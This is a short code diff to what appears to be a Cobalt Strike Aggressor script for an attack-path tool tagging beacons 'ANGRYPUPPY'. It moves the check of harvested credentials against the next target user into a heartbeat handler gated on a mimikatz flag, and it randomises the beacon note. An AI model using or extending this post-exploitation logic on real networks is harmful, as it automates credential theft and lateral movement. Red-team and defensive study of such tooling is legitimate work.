@@ -27,16 +27,18 @@ sub bhComputerToCS-sub{
 	return $computer;
 }
 
-on credentials {
+on heartbeat_5s {
 	
 	if ($attackActive eq $True){
-		bpause($currentBid, 5000);
-		foreach $cred (credentials()){
-			if (uc($cred["user"]) eq $nextLabel){
-				# Check if it's the target one we want
-				$waitFor = uc($nextLabel);
-			}
+		if ($mimikatz eq $True){
+			#bpause($currentBid, 5000);
+			foreach $cred (credentials()){
+				if (uc($cred["user"]) eq $nextLabel){
+					# Check if it's the target one we want
+					$waitFor = uc($nextLabel);
+				}
 
+			}
 		}
 	}
 }
@@ -51,7 +53,7 @@ on beacon_initial {
 		#bpause($currentBid,5000);
 		$bUser = beacon_info($bid, "user");
 		$bComputer = beacon_info($bid, "computer");
-		bnote($bid, "ANGRYPUPPY");
+		bnote($bid, "ANGRYPUPPY" . $randomPuppy);
 		if (uc($bComputer) eq $nextLabel){
 
 			$waitFor = uc($nextLabel);
